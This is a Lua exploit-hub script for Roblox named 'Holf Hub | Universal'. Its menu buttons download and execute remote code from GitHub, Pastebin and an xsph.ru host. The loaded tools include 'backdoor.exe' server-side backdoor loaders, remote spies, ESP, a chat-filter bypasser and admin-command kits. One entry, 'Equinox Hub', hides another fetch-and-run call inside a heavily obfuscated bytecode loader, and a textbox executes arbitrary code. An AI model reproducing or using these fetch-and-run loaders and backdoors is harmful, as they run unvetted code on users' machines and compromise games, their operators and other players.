repeat wait() until game:IsLoaded()

local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Holf Hub | Universal", "BloodTheme")
Window.Draggable = true
local GameId = game.PlaceId
local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name
local plrs = game:GetService("Players")
local plr = plrs.LocalPlayer
local plrname = plr.Name
local plrid = plr.UserId
local plrchr = plr.Character
local plrage = plr.AccountAge
local plrcount = #game.Players:GetPlayers()


local Tab = Window:NewTab("My Hub/Scripts")
local Section = Tab:NewSection("My Hub")
Section:NewButton("Wolf Hub (18 Games)", "My Hub/Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Podroka626/Scripts/main/Loader"))()
end)
Section:NewButton("AUT Script (A Universal Time)", "My Script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Podroka626/Scripts/main/AUT"))()
end)
local Section = Tab:NewSection("Welcome " ..plrname.. " to Holf Hub Universal")

local Tab = Window:NewTab("Dev Scripts")
local Section = Tab:NewSection("Some Scripts Need To Function In The Real Game")
Section:NewTextBox("Script Executer","Execute Scripts", function(txt)
loadstring(txt)()
end)

Section:NewButton("Remote Spy V2", "Make Fe Script or any script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/harisprofanny/d/main/Protected.lua%20(22).txt"))()
end)

Section:NewButton("Turtle Spy ", "Make Fe Script or any script", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Podroka626/Scripts/main/Turtle%20Spy.txt"))()
end)

Section:NewButton("Infinite Yield", "Gives you commands to use", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

Section:NewButton("Simple Spy ", "Make Fe Script or any script", function()
loadstring(game:HttpGet("https://github.com/exxtremestuffs/SimpleSpySource/raw/master/SimpleSpy.lua"))()
end)

Section:NewButton("CMD-X", "Admin Commands", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CMD-X/CMD-X/master/Source"))()
end)

Section:NewButton("Dex 2.0.0", "Better then dex 4 if your in mobile", function()
loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
end)

Section:NewButton("Dex 4", "dark mode i guess", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/loglizzy/dexV4/main/main.lua'))()
end)

Section:NewButton("K4 Backdoor Script", "its A ServerSide Script that's all", function()
game.StarterGui:SetCore(
		"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = "Loading v8"
		}
	)
game.StarterGui:SetCore(
		"SendNotification",
		{
			Title = "backdoor.exe",
			Duration = 3,
			Text = "Check Discord for newest script"
		}
	)

loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/v8/src/main.lua"))();



--	k4scripts
--	.------.
--	|4.--. |
--	| :│/: |
--	| :│\: |
--	| '--'4|
--	`------'

end)
Section:NewButton("Fps Counter", "See if Your roblox is laggy", function()
repeat wait() until game:IsLoaded() wait(2)
local ScreenGui = Instance.new("ScreenGui")
local Fps = Instance.new("TextLabel")

--Properties:

ScreenGui.Parent = game.CoreGui
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Fps.Name = "Fps"
Fps.Parent = ScreenGui
Fps.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Fps.BackgroundTransparency = 1.000
Fps.Position = UDim2.new(0.786138654, 0, 0, 0)
Fps.Size = UDim2.new(0, 125, 0, 25)
Fps.Font = Enum.Font.SourceSans
Fps.TextColor3 = Color3.fromRGB(1,1,1)
Fps.TextScaled = true
Fps.TextSize = 18.000
Fps.TextWrapped = true

-- Scripts:

local script = Instance.new('LocalScript', Fps)
local RunService = game:GetService("RunService")
RunService.RenderStepped:Connect(function(frame) -- This will fire every time a frame is rendered
script.Parent.Text = ("FPS: "..math.round(1/frame)) 
end)
end)


local Tab = Window:NewTab("Scripts")
local Section = Tab:NewSection("Scripts To Troll")
Section:NewButton("Universal Esp", "Esp BUT SO MUCH Better", function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/ZhenX201/fe-radar-script/main/source"))()
end)
Section:NewButton("Spectate", "Spectate People", function()
loadstring(game:HttpGet('https://pastebin.com/raw/wyvdb7gr'))()
end)
Section:NewButton("Clone script (Not Fe)", "clones you're avatar", function()
    loadstring(game:GetObjects('rbxassetid://7339698872')[1].Source)()
end)
Section:NewButton("Hide Player (Not fe)", "No People", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Hide%20Players'))()
end)
Section:NewButton("GreenScreen Gui", "perfect for videos", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Green%20Screen'))()
end)
Section:NewButton("Free Cam", "Free Cam for Roblox", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Break%20Camera'))()
end)
Section:NewButton("Tp Tools", "Click and you will be there", function()
loadstring(game:HttpGet(("https://pastebin.com/raw/ztp0P2fL"),true))()
end)
Section:NewButton("Language Translator", "Translator", function()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/YourLocalNzi/Language-translator-/main/Language%20translator", true))()
end)
Section:NewButton("Fe Chat Bypasser", "Bypass Chat", function()
   loadstring(game:HttpGet('https://raw.githubusercontent.com/bedra45/chetbypasser/main/chetbypass'))()
end)
Section:NewButton("Anti Fling", "You wont get fling", function()
   -- // Constants \\ --
-- [ Services ] --
local Services = setmetatable({}, {__index = function(Self, Index)
local NewService = game.GetService(game, Index)
if NewService then
Self[Index] = NewService
end
return NewService
end})

-- [ LocalPlayer ] --
local LocalPlayer = Services.Players.LocalPlayer

-- // Functions \\ --
local function PlayerAdded(Player)
   local Detected = false
   local Character;
   local PrimaryPart;

   local function CharacterAdded(NewCharacter)
       Character = NewCharacter
       repeat
           wait()
           PrimaryPart = NewCharacter:FindFirstChild("HumanoidRootPart")
       until PrimaryPart
       Detected = false
   end

   CharacterAdded(Player.Character or Player.CharacterAdded:Wait())
   Player.CharacterAdded:Connect(CharacterAdded)
   Services.RunService.Heartbeat:Connect(function()
       if (Character and Character:IsDescendantOf(workspace)) and (PrimaryPart and PrimaryPart:IsDescendantOf(Character)) then
           if PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 or PrimaryPart.AssemblyLinearVelocity.Magnitude > 100 then
               if Detected == false then
                   game.StarterGui:SetCore("ChatMakeSystemMessage", {
                       Text = "Fling Exploit detected, Player: " .. tostring(Player);
                       Color = Color3.fromRGB(255, 200, 0);
                   })
               end
               Detected = true
               for i,v in ipairs(Character:GetDescendants()) do
                   if v:IsA("BasePart") then
                       v.CanCollide = false
                       v.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
                       v.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
                       v.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
                   end
               end
               PrimaryPart.CanCollide = false
               PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
               PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0, 0, 0)
           end
       end
   end)
end

-- // Event Listeners \\ --
for i,v in ipairs(Services.Players:GetPlayers()) do
   if v ~= LocalPlayer then
       PlayerAdded(v)
   end
end
Services.Players.PlayerAdded:Connect(PlayerAdded)

local LastPosition = nil
Services.RunService.Heartbeat:Connect(function()
   pcall(function()
       local PrimaryPart = LocalPlayer.Character.PrimaryPart
       if PrimaryPart.AssemblyLinearVelocity.Magnitude > 250 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 250 then
           PrimaryPart.AssemblyAngularVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
           PrimaryPart.CFrame = LastPosition

           game.StarterGui:SetCore("ChatMakeSystemMessage", {
               Text = "You were flung. Neutralizing velocity.";
               Color = Color3.fromRGB(255, 0, 0);
           })
       elseif PrimaryPart.AssemblyLinearVelocity.Magnitude < 50 or PrimaryPart.AssemblyAngularVelocity.Magnitude > 50 then
           LastPosition = PrimaryPart.CFrame
       end
   end)
end)
end)


local Tab = Window:NewTab("Hubs | Guis")
local Section = Tab:NewSection("All Guis And Hubs")
Section:NewButton("GameHub V5","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/TakeModzz/Games-Hub-V5-Selector-Fixed/main/Games"))()
end)
Section:NewButton("Arceus V3 Hub","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/AZYsGithub/chillz-workshop/main/Arceus%20X%20V3"))()
end)
Section:NewButton("MoonUI V11","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/IlikeyocutgHAH/MoonUI-v11-v1/main/MoonUI"))()
end)
Section:NewButton("Spy Gui","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MichaelScripter/MiniScript/main/Spy%20gui.lua"))()
end)
Section:NewButton("Vcsk V Hub","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Vcsk/AstralHub/main/Main.lua", true))()
end)
Section:NewButton("GHub","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Xzekep/Xzekep/main/GHub%20made%20by%20ChrisTheScripter"))()
end)
Section:NewButton("MiniHub V2","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/MiniNoobie/MINI-HUB-V2/main/FINALLY%20UPDATED%20MINI%20HUB",true))()
end)
Section:NewButton("Simpler Hub","",function()
go = loadstring
href = "http://f0656793.xsph.ru/simpler.lua"
go(game:HttpGet(href))()
end)
Section:NewButton("IDesireDreams V1","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/YellowGreg/Loadstring/main/IDesireDreams-GUI-V1-YT"))()
end)
Section:NewButton("Universal Fe Scripts","",function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
end)
Section:NewButton("Equinox Hub","",function()

do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16)local v17=1;local v18;v15=v4(v3(v15,5),"..",function(v29)if (v1(v29,2)==79) then local v60=0;while true do if (v60==0) then v18=v0(v3(v29,1,1));return "";end end else local v61=v2(v0(v29,16));if v18 then local v70=v5(v61,v18);v18=nil;return v70;else return v61;end end end);local function v19(v30,v31,v32)if v32 then local v62=0 -0;local v63;while true do if (v62==0) then v63=(v30/(2^(v31-(1 + 0))))%(((1 + 1) -0)^(((v32-(1959 -(120 + 1838))) -(v31-(667 -(554 + 112)))) + (1595 -(1198 + (1692 -(1079 + 217))))));return v63-(v63%(2 -1));end end else local v64=((420 -(181 + 51)) -(119 + 67))^(v31-(4 -3));return (((v30%(v64 + v64))>=v64) and (1432 -(1125 + 306))) or (0 + (615 -(28 + 587)));end end local function v20()local v37=v1(v15,v17,v17);v17=v17 + 1;return v37;end local function v21()local v38,v39=v1(v15,v17,v17 + (514 -(214 + 298)));v17=v17 + 2;return (v39 * (765 -(360 + 149))) + v38;end local function v22()local v40,v41,v42,v43=v1(v15,v17,v17 + 3);v17=v17 + ((788 + 162) -(349 + 597));return (v43 * (16778427 -(15 + 1196))) + (v42 * (111652 -46116)) + (v41 * (534 -278)) + v40;end local function v23()local v44=v22();local v45=v22();return (( -(2 + 0) * v19(v45,32)) + (1398 -(502 + 155 + 740))) * (((1 -0) + 1)^(v19(v45,9 + 12,112 -81) -((1930 -(268 + 738)) + 99))) * ((((v19(v45,1062 -(102 + 959),12 + 8) * (((1226 -(44 + 699)) -((594 -333) + 220))^(583 -((200 -139) + 490)))) + v44)/((5 -3)^(19 + 33))) + ((2 + 0) -1));end local function v24(v33)local v46=(3635 -(300 + 1406)) -(164 + 1765);local v47;local v48;while true do if (v46==3) then return v6(v48);end if (v46==(2 -1)) then v47=v3(v15,v17,(v17 + v33) -(1 + 0));v17=v17 + v33;v46=1383 -((1165 -661) + 877);end if (v46==(0 + 0)) then v47=nil;if  not v33 then v33=v22();if (v33==(0 -0)) then return "";end end v46=1 + (0 -0);end if (v46==(1713 -(171 + 1540))) then v48={};for v71=1 + 0 + 0, #v47 do v48[v71]=v2(v1(v3(v47,v71,v71)));end v46=3;end end end local v25=v22;local function v26(...)return {...},v11("#",...);end local function v27()local v49=0;local v50;local v51;local v52;local v53;local v54;local v55;while true do local v59=0;while true do if (v59~=1) then else if (v49==2) then local v88=0;while true do if (v88~=0) then else for v98=399 -(185 + 213),v54 do local v99=0;local v100;local v101;local v102;local v103;while true do if (v99==(415 -(134 + 281))) then v100=0;v101=nil;v99=1 + 0;end if (v99~=(1 -0)) then else v102=nil;v103=nil;v99=2;end if (v99==(3 -1)) then while true do if (v100==(1480 -(801 + 678))) then v103=nil;while true do if (v101==1) then if (v102==(1 -0)) then v103=v20()~=0;elseif (v102==2) then v103=v23();elseif (v102~=3) then else v103=v24();end v55[v98]=v103;break;end if (v101==0) then local v140=1113 -(882 + 231);local v141;while true do if (v140~=(949 -(674 + 275))) then else v141=0;while true do if ((0 + 0)==v141) then local v156=0 -0;local v157;while true do if ((0 -0)~=v156) then else v157=0;while true do if (v157~=0) then else local v164=0;while true do if (v164~=0) then else v102=v20();v103=nil;v164=1;end if (v164==(1 -0)) then v157=1 + 0;break;end end end if (v157==(1716 -(769 + 946))) then v141=359 -(196 + 162);break;end end break;end end end if (v141==(1 + 0)) then v101=1 + 0;break;end end break;end end end end break;end if (v100==(0 + 0)) then local v129=0;local v130;while true do if (v129~=(0 -0)) then else v130=1765 -(1621 + 144);while true do if ((516 -(377 + 138))~=v130) then else v100=3 -2;break;end if ((0 + 0)~=v130) then else local v145=0 -0;while true do if (v145~=(117 -(112 + 4))) then else v130=3 -2;break;end if (v145==0) then v101=0;v102=nil;v145=1;end end end end break;end end end end break;end end end v53[11 -8]=v20();v88=1 + 0;end if (v88==1) then for v104=1346 -(1220 + 125),v22() do local v105=0 -0;local v106;local v107;while true do if (v105==1) then while true do if (v106~=0) then else v107=v20();if (v19(v107,1 -0,4 -3)==(122 -(74 + 48))) then local v134=0 + 0;local v135;local v136;local v137;local v138;while true do if (v134~=(1 + 1)) then else while true do if (v135==(692 -(460 + 229))) then if (v19(v137,5 -2,3)==(1860 -(1367 + 492))) then v138[4]=v55[v138[4]];end v50[v104]=v138;break;end if ((0 + 0)~=v135) then else local v150=0;while true do if (v150~=1) then else v135=1045 -(704 + 340);break;end if ((0 -0)==v150) then v136=v19(v107,2,3);v137=v19(v107,4,1164 -(327 + 831));v150=1;end end end if (v135==2) then local v151=0 + 0;while true do if (v151==(528 -(201 + 327))) then if (v19(v137,1,1)~=1) then else v138[2]=v55[v138[2]];end if (v19(v137,1 + 1,2)==(1 + 0)) then v138[3]=v55[v138[3]];end v151=1;end if (v151==(1 + 0)) then v135=3 + 0;break;end end end if (v135==(1129 -(70 + 1058))) then local v152=0 + 0;while true do if (v152~=(0 -0)) then else local v160=0;while true do if (v160~=(1417 -(875 + 541))) then else v152=4 -3;break;end if (v160~=0) then else v138={v21(),v21(),nil,nil};if (v136==(0 + 0)) then local v165=0;local v166;while true do if (v165==0) then v166=903 -(297 + 606);while true do if (v166~=(1709 -(848 + 861))) then else v138[3]=v21();v138[2 + 2]=v21();break;end end break;end end elseif (v136==(1 -0)) then v138[2 + 1]=v22();elseif (v136==2) then v138[7 -4]=v22() -(2^(44 -(18 + 10)));elseif (v136==3) then local v171=0;local v172;local v173;local v174;while true do if ((2 -1)==v171) then v174=nil;while true do if (v172==(1398 -(748 + 650))) then v173=0 + 0;v174=nil;v172=1 + 0;end if (v172==(1 + 0)) then while true do if (v173==(0 + 0)) then v174=0 -0;while true do if (v174~=(1167 -(230 + 937))) then else v138[1247 -(556 + 688)]=v22() -((7 -5)^16);v138[15 -11]=v21();break;end end break;end end break;end end break;end if (v171==0) then v172=1748 -(1265 + 483);v173=nil;v171=1;end end end v160=1 + 0;end end end if (v152~=1) then else v135=2;break;end end end end break;end if (v134==0) then local v144=0 + 0;while true do if (v144==0) then v135=0;v136=nil;v144=1279 -(978 + 300);end if (v144~=(1678 -(985 + 692))) then else v134=1 + 0;break;end end end if (v134~=(1 + 0)) then else v137=nil;v138=nil;v134=2;end end end break;end end break;end if (v105~=0) then else local v112=0;while true do if (v112~=0) then else v106=0 -0;v107=nil;v112=833 -(590 + 242);end if (v112==(1 + 0)) then v105=1 + 0;break;end end end end end v49=1 + 2;break;end end end if (v49~=0) then else local v89=907 -(555 + 352);local v90;while true do if (v89~=(0 -0)) then else v90=13 -(12 + 1);while true do if (v90~=0) then else v50={};v51={};v90=1356 -(553 + 802);end if (v90==(1 -0)) then v52={};v49=1;break;end end break;end end end break;end if (v59~=0) then else if (v49~=3) then else local v91=0 + 0;while true do if (0~=v91) then else for v108=1 + 0,v22() do v51[v108-1]=v27();end for v110=1,v22() do v52[v110]=v22();end v91=1;end if (v91==1) then return v53;end end end if (v49~=(3 -2)) then else local v92=0;while true do if (v92==1) then v55={};v49=2;break;end if (v92~=(0 -0)) then else local v97=0 -0;while true do if (v97~=0) then else v53={v50,v51,nil,v52};v54=v22();v97=1;end if (v97==(1419 -(1295 + 123))) then v92=1391 -(210 + 1180);break;end end end end end v59=1;end end end end local function v28(v34,v35,v36)local v56=v34[1];local v57=v34[2];local v58=v34[3];return function(...)local v65=1;local v66= -1;local v67={...};local v68=v11("#",...) -1;local function v69()local v73=v56;local v74=Const;local v75=v57;local v76=v58;local v77=v26;local v78={};local v79={};local v80={};for v86=0 + 0,v68 do if (((45 + 177)<(2433 + (2868 -(616 + 136)))) and (v86>=v76)) then v78[v86-v76]=v67[v86 + (1 -0)];else v80[v86]=v67[v86 + (1797 -(440 + 1356))];end end local v81=(v68-v76) + (1413 -(319 + 1093));local v82;local v83;while true do local v87=0 + 0;while true do if ((v87==(1 + 0)) or ((17446 -13037)<=(4910 -(1036 + 268)))) then if (((2766 -(43 + 1527))<(5589 -1313)) and (v83<=(1875 -(243 + 1629)))) then if (((88 + 361)==449) and (v83<=((2334 -(54 + 1854)) -(165 + (1997 -(257 + 1480)))))) then if ((v83>(0 + 0)) or ((4607 -2959)>(665 + 2384))) then v80[v82[560 -(237 + 321)]]=v82[1 + 2]~=(0 + 0);else v80[v82[2 + 0]]();end elseif ((v83>(6 -4)) or ((3335 -(793 + 193))>(8611 -6174))) then v80[v82[3 -1]]=v82[3 -0];else local v115=0 -0;local v116;local v117;while true do if (((0 -0)==v115) or (4982<(6483 -4753))) then v116=878 -((109 -39) + 808);v117=nil;v115=918 -(81 + 836);end if ((v115==(1 + 0)) or (((20302 -(125 + 200)) -15647)==(5285 -(460 + 1113)))) then while true do if (((2655 -(568 + 892))<=(6684 -(80 + 1905))) and (v116==(300 -(287 + 13)))) then v117=v82[3 -1];v80[v117]=v80[v117](v12(v80,v117 + (34 -(25 + 8)),v66));break;end end break;end end end elseif ((((506 + 2619) -2274)<1849) and (v83<=(4 + 1))) then if ((v83>(8 -4)) or ((645 + 378)>(2589 + (2141 -(400 + 135))))) then local v118=0 -0;local v119;local v120;local v121;local v122;local v123;local v124;while true do if ((v118==(0 + 0)) or ((3361 -(107 + 15 + 4))<=(3629 -(411 + 571 + 33)))) then v119=672 -(598 + 74);v120=nil;v118=824 -(757 + 66);end if ((v118==(1090 -(770 + 319))) or ((2291 -(1053 + 76))<(124 + 409))) then v121=nil;v122=nil;v118=2 -0;end if (((2632 -(762 + 83))<(5890 -(1610 + 251))) and (v118==(1 + 1 + 0))) then v123=nil;v124=nil;v118=1 + 2;end if (((1820 -(995 + 654))<=((12757 -5222) -4762)) and (v118==(1051 -(569 + 479)))) then while true do if ((v119==(1 + 0 + 1)) or ((830 + 230)>(6386 -3196))) then v124=nil;while true do if (((1754 + 22 + 29)<=(4524 -(374 + 990))) and (v120==(0 -0))) then local v146=0;local v147;while true do if ((((2896 -(121 + 57)) + 1734)>3913) and (v146==(0 + 0))) then v147=0 -0;while true do if ((v147==(1 + (1619 -(660 + 959)))) or ((399 + 3084)<=894)) then v120=1 + 0;break;end if ((v147==(0 + 0)) or (4321>=((3717 + 12291) -11485))) then v121=v82[1307 -(560 + 745)];v122,v123=v77(v80[v121](v12(v80,v121 + 1 + 0,v82[2 + 1 + 0])));v147=1 + 0;end end break;end end end if (((1287 + 3314)==(6481 -(214 + 1666))) and (v120==(649 -(112 + 535)))) then for v153=v121,v66 do local v154=0 -0;local v155;while true do if (((2845 -((3121 -(1121 + 629)) + 305))<=(2595 -(239 + 119))) and ((1175 -(554 + 621))==v154)) then v155=0 + 0;while true do if (((333 + 69)<=((2320 -(28 + 1504)) -(228 + 35))) and (v155==(1529 -(1301 + 228)))) then v124=v124 + (2 -1);v80[v153]=v122[v124];break;end end break;end end end break;end if ((((4691 + 1780) -(1514 + 288))>=(11473 -6853)) and (v120==(1 + (1880 -(1480 + 400))))) then local v148=0 -0;while true do if ((((3850 + 498) -1164)<=(392 + 3922)) and (v148==(491 -(317 + 173)))) then v120=(825 -(321 + 502)) + 0;break;end if ((v148==(0 + 0)) or ((271 + 535)<(439 + (1633 -(297 + 1154))))) then local v159=(1144 -(10 + 1134)) -0;while true do if ((v159==(0 + 0)) or ((116 + 3766)>(1807 + 2937))) then v66=(v123 + v121) -(1 -0);v124=0 + 0;v159=145 -(86 + 58);end if (((1576 -(1454 + 121))==v159) or ((972 + 526)<=(532 + 219))) then v148=1 + 0;break;end end end end end end break;end if (((1495 + 2806)>2856) and (v119==(0 -0))) then local v143=1614 -(781 + 271 + 562);while true do if ((v143==(0 + 0)) or ((6242 -(2477 + 343))<(3988 -(120 + 1046)))) then v120=1431 -(729 + 702);v121=nil;v143=1 -0;end if (((1938 -(349 + 117))>(1563 -1184)) and (v143==(1 + 0))) then v119=1 + 0;break;end end end if ((v119==(1404 -(1097 + 306))) or ((60 -37)==3997)) then v122=nil;v123=nil;v119=458 -(413 + (785 -(551 + 191)));end end break;end end else local v125=0 -0;local v126;local v127;while true do if (((2409 + 1560)>=(2245 + 998)) and (v125==(1010 -(574 + 435)))) then v80[v126 + 1 + 0]=v127;v80[v126]=v127[v82[2 + 2]];break;end if (((11889 -9136)<(380 + 1256 + 1660)) and ((0 + 0)==v125)) then local v133=0 -0;while true do if ((v133==(1097 -(395 + 701))) or (3922<(893 + 2136))) then v125=2 -1;break;end if (((4182 -2799)==(3054 -(669 + 1002))) and (v133==(0 -0))) then v126=v82[1 + 1];v127=v80[v82[3 + 0]];v133=1 + 0;end end end end end elseif (((4150 -2231)>=(2798 -(1601 + 314))) and (v83>(3 + 3))) then do return;end else v80[v82[1 + 1]]=v36[v82[(1796 -(1370 + 424)) + 1]];end v65=v65 + 1 + 0;break;end if ((v87==((1161 -(514 + 647)) -(0 + 0))) or (((773 -420) + 586)>=(2284 + 2426))) then local v95=0 -(0 -0);while true do if ((v95==(1 + 0)) or ((177 + 2292)<(2193 -1508))) then v87=(2 -1) + 0;break;end if (((12871 -8608)==4263) and (v95==((0 -0) -0))) then v82=v73[v65];v83=v82[1 + 0];v95=1746 -(1558 + 187);end end end end end end A,B=v26(v10(v69));if  not A[1] then local v84=0;local v85;while true do if (0==v84) then v85=v34[4][v65] or "";error("Script error at ["   .. v85   .. "]:"   .. A[2]);break;end end else return v12(A,2,B);end end;end return v28(v27(),{},v16)();end v14("LOL!043O00030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403493O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4B524E4C322F756E6976657273616C687562756C74696D6174652F6D61696E2F7570646174653100093O0012063O00013O001206000100023O002004000100010003001203000300044O0001000400014O0005000100044O00025O00026O000100012O00073O00017O00093O00023O00023O00023O00023O00023O00023O00023O00023O00033O00",v8());end
end)
Section:NewButton("UTG V4","",function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukezz/UTG-V4/main/Lib.lua"))()

local Main_ = libary:CreateMain()

Main_:CreateButton("Neptunion V", "Demonic Greatsword", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/AdLeNbD7"))()
end)

Main_:CreateButton("Rb Neptunion", "Sword of Truth",function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ztTyE58C"))()
end)

Main_:CreateButton("Krystal Dance", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/FV3HLmTH"))()
end)

Main_:CreateButton("Walk On Walls", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RY9cBbdG"))()
end)

Main_:CreateButton("Sonic", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/SyF5t70A"))()
end)

Main_:CreateButton("Among Us V4", function()
	loadstring(game:HttpGetAsync("https://paste.ee/r/6c5AO/0"))()
end)

Main_:CreateButton("Killbot V2", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ydQ1ysuA"))()
end)

Main_:CreateButton("Neko Maid", function()
	loadstring(game:HttpGetAsync("https://paste.ee/d/iCtCM/0"))()
end)

Main_:CreateButton("R15 Invis", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/uc6nN23y"))()
end)

Main_:CreateButton("Achromatic", "Shadow Blademasters Blade, Blademasters Blade", "Golden Demonic Greatsword, Corrupt Demonic Greatsword", "Frozen Demonic Greatsword, Demonic Greatsword", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ziSNxnKP"))()
end)

Main_:CreateButton("Trash Can", "Trash Can", "Trash Cam Lid", "Destructive Aura", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/zeYrMRa2"))()
end)

Main_:CreateButton("Chill", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/XmHFdTij"))()
end)

Main_:CreateButton("Ultimate Meme Dance", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/0QfjMKrF"))()
end)

Main_:CreateButton("Joy", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/LEAQuKj0"))()
end)

Main_:CreateButton("Spider", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/QjjD7gx1"))()
end)

Main_:CreateButton("SkateBoard Remastered", "Skateboard #12: Checker Chase", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xqAN0bhi"))()
end)

Main_:CreateButton("VR", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/vGrV94iZ"))()
end)

Main_:CreateButton("Stand", "Robox, Brown Hair", "Chestnut Bun, Pal Hair", "Red Roblox Cap", "Lavender-Updo", "ROBLOX-Girl-Hair", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RZUwatYV"))()
end)

Main_:CreateButton("Xester", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RPwyPvEi"))()
end)

Main_:CreateButton("Elio Blasio", "METAL x LIGHTSEER 77", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xvBXu6Yc"))()
end)

Main_:CreateButton("Elio Blasio V2", "METAL x LIGHTSEER 77", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/MNenPDAw"))()
end)

Main_:CreateButton("Sniper", "Cyberpunk Sniper7", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/xwhiWedh"))()
end)

Main_:CreateButton("Black Hole (Contros unanchored parts E to move black hole)", "None", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ijZtSa5c"))()
end)

Main_:CreateButton("Smug Dance", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/Zawb88SA"))()
end)

Main_:CreateButton("Chips", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/w36Bzq3k"))()
end)

Main_:CreateButton("Gale Fighter", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/5jBTETjn"))()
end)

Main_:CreateButton("Headless", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/QUDSU8Fk"))()
end)

Main_:CreateButton("FireCube", "Fiery-Fox-Shoulder-Pal", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/D7pigANg"))()
end)

Main_:CreateButton("/Kill Command", "None", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/iV0nshSk"))()
end)

Main_:CreateButton("Memeus", "None", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/2MSTmKBa"))()
end)

Main_:CreateButton("Pen", "Corrupt Demonic Greatsword", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ALEpWneG"))()
end)

Main_:CreateButton("Baller V2", "Red Stickman Head, International Fedora - USA", "International Fedora - Colombia", "International Fedora - Argentina", "International Fedora - Vietnam", "International Fedora - Brazil", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/ALEpWneG"))()
end)

Main_:CreateButton("Baller", "Red Stickman Head", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Lowerrated/roblox-fe-baller-script/main/main"))()
end)

Main_:CreateButton("Piano Autoplayer", "None", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Sw1ndlerScripts/RobloxScripts/main/MiscScripts/PianoAutoplayer.lua"))()
end)

Main_:CreateButton("Unanchored Gui", "None", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/WkZwcGjf"))()
end)

Main_:CreateButton("Fake Lag", "None", "", "", "", "", function()
	loadstring(game:HttpGetAsync("https://pastebin.com/raw/tUE47M3a"))()
end)

